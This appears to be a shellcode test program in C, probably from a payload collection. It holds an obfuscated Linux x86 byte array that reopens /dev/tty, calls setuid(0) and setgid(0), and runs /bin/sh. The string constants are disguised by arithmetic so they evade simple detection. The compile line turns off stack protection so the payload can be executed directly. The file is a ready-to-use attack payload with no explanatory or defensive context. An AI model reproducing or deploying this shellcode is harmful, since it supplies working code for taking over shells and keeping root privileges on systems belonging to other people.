#include<stdio.h>
#include<string.h>

/*

Compilation: gcc -fno-stack-protector -z execstack shellcode1-poly.c -o shellcode1-poly
Execution: ./shellcode1-poly

*/


unsigned char shellcode[] = \

"\x99\xb0\x06\xcd\x80\x52\xbf\x22\x22\x22\x22\x81\xc7\x0d\x52\x52\x57\x89"
"\x7c\x24\xfc\xbf\x22\x22\x22\x22\x81\xc7\x0d\x42\x43\x54\x89\x7c\x24\xf8"
"\x83\xec\x08\x89\xe3\x66\xb9\x12\x27\xb0\x05\xcd\x80\xb0\x17\x31\xdb\xcd"
"\x80\xb0\x2e\xcd\x80\x31\xc0\x50\xbe\x22\x22\x11\x11\x81\xc6\x0d\x0d\x62"
"\x57\x89\x74\x24\xfc\xbe\x11\x11\x22\x22\x81\xc6\x1e\x51\x47\x4c\x89\x74"
"\x24\xf8\x83\xec\x08\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{
	
	printf("Shellcode length: %d\n",strlen(shellcode));

	int (*ret)() = (int(*)())shellcode;

	ret();
	
}
